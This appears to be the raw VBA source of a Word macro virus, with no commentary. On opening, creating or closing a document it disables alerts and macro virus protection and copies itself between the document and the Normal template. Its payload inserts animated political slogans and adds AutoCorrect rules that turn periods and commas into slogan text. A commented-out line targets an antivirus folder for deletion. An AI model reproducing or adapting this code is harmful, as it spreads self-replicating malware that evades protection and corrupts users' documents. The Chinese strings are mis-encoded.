   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Sub Document_Close()
   Rem
   Rem ProgramName "¦³¹Ú³Ì?.§Æ±æ¬ÛÀH"
   Call Document_Open
   End Sub
   Private Sub Document_New()
   Call Document_Open
   End Sub
   Private Sub Document_Open()
   On Error Resume Next
   Application.DisplayAlerts = wdAlertsNone
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   NormInstalled = False
   ActInstalled = False
   If NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(2, 1) = "Rem" Then NormInstalled = True
   If ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(2, 1) = "Rem" Then ActInstalled = True
   If NormInstalled = True And ActInstalled = True Then GoTo Killer
   If NormInstalled = False Then
       Set Inf = NormalTemplate.VBProject.VBComponents(1).CodeModule
       Set Noc = ActiveDocument.VBProject.VBComponents(1).CodeModule
   Else
       Set Inf = ActiveDocument.VBProject.VBComponents(1).CodeModule
       Set Noc = NormalTemplate.VBProject.VBComponents(1).CodeModule
   End If
   With Noc
       Code = .Lines(1, .CountOfLines)
   End With
   With Inf
       .DeleteLines 1, .CountOfLines
       .InsertLines 1, Code
   End With
   Application.DisplayAlerts = wdAlertsAll
   ''WordBasic.Kill "c:\Program Files\Trend Pc-cillin 98\*.*"
   Exit Sub
   Killer:
    If Month(Date) = Int(Rnd * 12 + 1) Then
    ActiveWindow.Caption = "¦³¹Ú³Ì?.§Æ±æ¬ÛÀH"
     Set ULTRAS = ActiveDocument.Range(Start:=0, End:=0)
       With ULTRAS
           .InsertBefore "¦³¹Ú³Ì?.§Æ±æ¬ÛÀH" + Chr(13)
           .Font.Size = 42
           .Font.Name = "²Ó©úÅé"
           .Font.ColorIndex = wdGreen
           .Font.Shadow = 1
           .Font.Animation = wdAnimationLasVegasLights
       End With
    AutoCorrect.Entries.Add Name:=".", Value:="·s¥x?.·s°ê®a.·s§Æ±æ"
    AutoCorrect.Entries.Add Name:=",", Value:="¦³¹Ú³Ì?.§Æ±æ¬ÛÀH"
    End If
   End Sub
